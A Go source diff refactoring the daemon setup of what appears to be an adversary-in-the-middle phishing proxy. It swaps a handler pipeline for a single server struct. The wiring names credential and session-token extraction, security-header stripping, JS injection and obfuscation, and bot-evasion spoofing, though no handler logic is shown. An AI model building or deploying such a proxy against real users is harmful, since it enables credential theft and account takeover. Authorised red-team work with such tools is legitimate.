@@ -20,8 +20,6 @@ import (
 	"github.com/travisbale/mirage/internal/obfuscator"
 	"github.com/travisbale/mirage/internal/phishlet"
 	"github.com/travisbale/mirage/internal/proxy"
-	"github.com/travisbale/mirage/internal/proxy/handlers/request"
-	"github.com/travisbale/mirage/internal/proxy/handlers/response"
 	"github.com/travisbale/mirage/internal/puppet"
 	"github.com/travisbale/mirage/internal/store/sqlite"
 )
@@ -47,7 +45,7 @@ type Daemon struct {
 	certSource        aitm.CertSource
 
 	// Proxy.
-	proxy *proxy.AITMProxy
+	proxy *proxy.Server
 
 	// JS obfuscator — always non-nil after New (no-op when disabled).
 	obfuscator scriptObfuscator
@@ -297,24 +295,22 @@ func (ini *initializer) initProxy(version string) error {
 		}
 	}
 
-	pipeline := buildPipeline(pipelineDeps{
-		botGuardSvc:  ini.botGuardSvc,
-		blacklistSvc: ini.blacklistSvc,
-		sessionSvc:   ini.sessionSvc,
-		phishletSvc:  ini.phishletSvc,
-		spoofProxy:   ini.spoofProxy,
-		apiHandler:   apiHandler,
-		apiHostname:  ini.cfg.API.SecretHostname,
-		obfuscator:   ini.obfuscator,
-		puppetSvc:    ini.puppetSvc,
-	}, ini.logger)
-
-	aitmProxy := &proxy.AITMProxy{
-		CertSource: ini.certSource,
-		Pipeline:   pipeline,
-		WSHub:      ini.wsHub,
-		Spoof:      ini.spoofProxy,
-		Logger:     ini.logger,
+	aitmProxy := &proxy.Server{
+		Addr:           fmt.Sprintf(":%d", ini.cfg.HTTPSPort),
+		CertSource:     ini.certSource,
+		SecretHostname: ini.cfg.API.SecretHostname,
+		BotGuard:       ini.botGuardSvc,
+		Blacklist:      ini.blacklistSvc,
+		Spoof:          ini.spoofProxy,
+		PhishletSvc:    ini.phishletSvc,
+		SessionSvc:     ini.sessionSvc,
+		PuppetSvc:      ini.puppetSvc,
+		TelemetryScore: ini.botGuardSvc,
+		Obfuscator:     ini.obfuscator,
+		WSHub:          ini.wsHub,
+		APIHandler:     apiHandler,
+		Logger:         ini.logger,
+		ScoreThreshold: 0.6,
 	}
 
 	apiCACertPath := filepath.Join(ini.cfg.DataDir, "api-ca.crt")
@@ -445,80 +441,4 @@ func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
 	}
 
 	return api.Load(certPath)
-}
-
-// ---- pipeline ---------------------------------------------------------------
-
-type pipelineDeps struct {
-	botGuardSvc  *aitm.BotGuardService
-	blacklistSvc *aitm.BlacklistService
-	sessionSvc   *aitm.SessionService
-	phishletSvc  *aitm.PhishletService
-	spoofProxy   *proxy.SpoofProxy
-	apiHandler   *api.Router
-	apiHostname  string
-	obfuscator   scriptObfuscator
-	puppetSvc    *aitm.PuppetService
-}
-
-func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
-	return &proxy.Pipeline{
-		RequestHandlers: []proxy.RequestHandler{
-			&request.JA4Extractor{},
-			&request.BotGuardCheck{
-				Service: d.botGuardSvc,
-				Spoof:   d.spoofProxy,
-			},
-			&request.IPExtractor{},
-			&request.BlacklistChecker{
-				Service: d.blacklistSvc,
-				Spoof:   d.spoofProxy,
-			},
-			&request.APIRouter{
-				SecretHostname: d.apiHostname,
-				Handler:        d.apiHandler,
-			},
-			&request.PhishletRouter{
-				Resolver: d.phishletSvc,
-				Spoof:    d.spoofProxy,
-			},
-			&request.InterceptHandler{},
-			&request.SessionGate{
-				Sessions: d.sessionSvc,
-				Spoof:    d.spoofProxy,
-				Logger:   logger,
-			},
-			&request.LureRedirector{},
-			&request.PuppetOverrideResolver{
-				Source: d.puppetSvc,
-			},
-			&request.TelemetryScoreCheck{
-				Scorer:    d.botGuardSvc,
-				Spoof:     d.spoofProxy,
-				Threshold: 0.6,
-			},
-			&request.URLRewriter{},
-			&request.CredentialExtractor{
-				Capturer: d.sessionSvc,
-				Logger:   logger,
-			},
-			&request.ForcePostInjector{Logger: logger},
-		},
-		ResponseHandlers: []proxy.ResponseHandler{
-			&response.SecurityHeaderStripper{},
-			&response.TokenExtractor{
-				Sessions:  d.sessionSvc,
-				Whitelist: d.blacklistSvc,
-				Logger:    logger,
-			},
-			&response.CookieRewriter{},
-			&response.SubFilterApplier{},
-			&response.JSInjector{},
-			&response.JSObfuscator{
-				Obfuscator: d.obfuscator,
-				Logger:     logger,
-			},
-		},
-		Logger: logger,
-	}
 }
